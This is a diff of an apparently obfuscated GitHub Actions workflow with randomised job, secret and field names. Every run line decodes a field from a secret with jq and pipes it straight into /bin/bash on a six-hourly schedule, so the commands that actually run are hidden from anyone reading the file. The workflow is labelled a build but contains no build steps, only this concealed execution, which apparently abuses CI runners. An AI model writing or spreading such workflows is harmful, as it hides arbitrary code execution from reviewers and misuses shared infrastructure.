@@ -1,24 +1,32 @@
 name: bishopsdutiful
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
-jobs:  # 2831
+    - cron: '57 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bishopsdutiful
         env:
-          rh522: ${{ secrets.rh522 }}
+          tpoyx513: ${{ secrets.tpoyx513 }}
         run: |
-          echo $rh522 | jq -r .zf5 | /bin/bash
-          echo $nmkdk7 | jq -r .qnoky60644 | /bin/bash
-          echo $i4476 | jq -r .ddms55 | /bin/bash
-          echo $frli2 | jq -r .hoykh866 | /bin/bash
-          echo $k98076 | jq -r .kyzzg4 | /bin/bash
-          echo $tiej47297 | jq -r .oa851 | /bin/bash
-          echo $vn8 | jq -r .l52702 | /bin/bash
-          echo $xekc0193 | jq -r .a45423 | /bin/bash
-          echo $v6 | jq -r .afdu57575 | /bin/bash
+          echo $tpoyx513 | jq -r .gmp858 | /bin/bash
+          echo $hk58098 | jq -r .fyl158 | /bin/bash
+          echo $tva21 | jq -r .hb2664 | /bin/bash
+          echo $kwnk4471 | jq -r .ana501 | /bin/bash
+          echo $r577 | jq -r .v8475 | /bin/bash
+          echo $fagao8 | jq -r .tr3 | /bin/bash
+          echo $wnbg2 | jq -r .eiabb9 | /bin/bash
+          echo $tjy77 | jq -r .intq39 | /bin/bash
+          echo $agbbj350 | jq -r .l0 | /bin/bash
+          echo $hg12 | jq -r .xp830 | /bin/bash
+          echo $tykn49 | jq -r .xrh97742 | /bin/bash
+          echo $hq63 | jq -r .usfq15 | /bin/bash
+          echo $do843 | jq -r .a66527 | /bin/bash
+          echo $hnrpz19 | jq -r .mi7232 | /bin/bash
+          echo $bz4 | jq -r .p605 | /bin/bash
 
